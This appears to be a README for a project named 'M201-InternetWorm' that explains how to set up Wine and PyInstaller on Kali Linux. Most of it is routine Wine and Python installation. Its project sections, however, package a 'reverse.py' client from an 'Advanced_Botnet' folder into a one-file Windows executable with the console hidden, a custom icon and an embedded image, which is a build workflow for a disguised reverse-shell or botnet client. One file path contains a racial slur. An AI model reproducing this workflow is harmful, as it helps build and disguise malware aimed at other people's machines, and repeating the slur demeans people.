# Wine Setup Guide for Cross-Platform Development

This guide provides comprehensive instructions for setting up Wine on Kali Linux to enable Windows executable creation and cross-platform development for the M201-InternetWorm project.

## 📌 Wine Full Setup on Kali (32-bit + 64-bit support)

### Prerequisites
- Kali Linux system with sudo privileges
- Internet connection for package downloads

### Installation Steps

```bash
# 1. Enable 32-bit architecture support
sudo dpkg --add-architecture i386

# 2. Update package lists
sudo apt-get update

# 3. Install Wine and dependencies (both 32-bit + 64-bit support)
sudo apt-get install wine wine32 wine64 libwine libwine:i386 fonts-wine -y

# 4. (Optional but recommended) Install Winetricks helper
sudo apt-get install winetricks -y

# 5. Initialize Wine (this creates ~/.wine)
winecfg
```

## 📂 Verification

After running `winecfg`, verify the installation:

```bash
ls -la ~/.wine
```

### Expected Directory Structure:
```
dosdevices/
drive_c/
system.reg
user.reg
userdef.reg
```

## ▶️ Running Windows Programs

### Basic Wine Commands
```bash
# Run Windows Notepad
wine notepad

# Run any Windows executable
wine program.exe

# Access Windows Program Files directory
ls ~/.wine/drive_c/Program\ Files/
```

## 🐍 Installing Python 3 in Wine (Windows Version)

### Download Python Installer
```bash
wget https://www.python.org/ftp/python/3.13.7/python-3.13.7-amd64.exe -O ~/python-installer.exe
```

### Install Python in Wine
1. **Run the installer with Wine:**
   ```bash
   wine ~/python-installer.exe
   ```

2. **Verify Python installation:**
   ```bash
   wine cmd
   python --version
   python
   ```

## 🔧 Installing PyInstaller in Wine's Windows Python

### Installation Commands
```bash
# Enter Wine command prompt
wine cmd

# Install PyInstaller using pip
py -m pip install pyinstaller
# OR
python -m pip install pyinstaller

# Verify installation
pyinstaller --version
```

### Basic PyInstaller Usage
```bash
# Simple executable creation
pyinstaller yourscript.py

# Direct path execution
wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe
```

## 🚀 Advanced PyInstaller Commands for M201-InternetWorm

### Basic Executable Creation
```bash
wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe --onefile --noconsole reverse.py
```

### Advanced Executable with Icon and Embedded Files
```bash
# Command with image embedding and custom icon
wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe \
  --add-data="/path/to/your/image.jpg:." \
  --onefile \
  --noconsole \
  --icon="/path/to/your/icon.ico" \
  reverse.py
```

### Example Commands for Project Files
```bash
# For reverse.py with embedded image and icon
wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe \
  --add-data="/home/kali/Desktop/Offensive hacking/Advanced_Botnet/Nigger_city.jpg:." \
  --onefile \
  --noconsole \
  --icon="/home/kali/Desktop/Offensive hacking/Advanced_Botnet/extract_icons/fire_icon.ico" \
  reverse.py
```

## 📋 PyInstaller Options Explained

| Option | Description |
|--------|-------------|
| `--onefile` | Create a single executable file |
| `--noconsole` | Hide console window (Windows GUI mode) |
| `--icon=path` | Set custom icon for executable |
| `--add-data=src:dest` | Include additional files in executable |
| `--hidden-import=module` | Include modules not automatically detected |
| `--name=name` | Set custom name for executable |

## 🔍 Troubleshooting

### Common Issues and Solutions

1. **Wine Configuration Issues:**
   ```bash
   # Reconfigure Wine
   winecfg
   
   # Reset Wine prefix
   rm -rf ~/.wine
   winecfg
   ```

2. **Python Installation Problems:**
   ```bash
   # Check Wine Python installation
   wine python --version
   
   # List installed programs
   wine uninstaller
   ```

3. **PyInstaller Path Issues:**
   ```bash
   # Find PyInstaller location
   wine cmd
   where pyinstaller
   
   # Or check Scripts directory
   ls ~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/
   ```

## 🛡️ Security Considerations

### For Educational Use:
- Only use Wine setup for authorized testing environments
- Ensure proper isolation when creating Windows executables
- Test executables in controlled environments (VMs)
- Follow responsible disclosure practices

### Best Practices:
- Use separate Wine prefixes for different projects
- Regular backups of Wine configurations
- Keep Wine and Python versions updated
- Document all build processes for reproducibility

## 📁 Project Integration

### Building M201-InternetWorm Components

1. **Server Components (Linux Native):**
   ```bash
   python3 threaded_server.py <IP> <PORT>
   python3 server.py <IP> <PORT>
   ```

2. **Client Component (Windows Executable):**
   ```bash
   # Build Windows executable for reverse.py
   wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe \
     --onefile --noconsole reverse.py
   ```

### Output Locations
- **Linux executables:** Current directory
- **Wine-built Windows executables:** `~/.wine/drive_c/users/root/dist/`

## 🔗 Additional Resources

- [Wine Official Documentation](https://www.winehq.org/documentation)
- [PyInstaller Documentation](https://pyinstaller.readthedocs.io/)
- [Python Windows Installer](https://www.python.org/downloads/windows/)
- [Winetricks Database](https://github.com/Winetricks/winetricks)

## ⚠️ Important Notes

- This setup is for **educational and authorized testing purposes only**
- Always comply with local laws and regulations
- Use proper authorization before deploying any executables
- Test all builds in isolated environments first

---

**Remember: Cross-platform development requires careful testing and validation across all target platforms.**
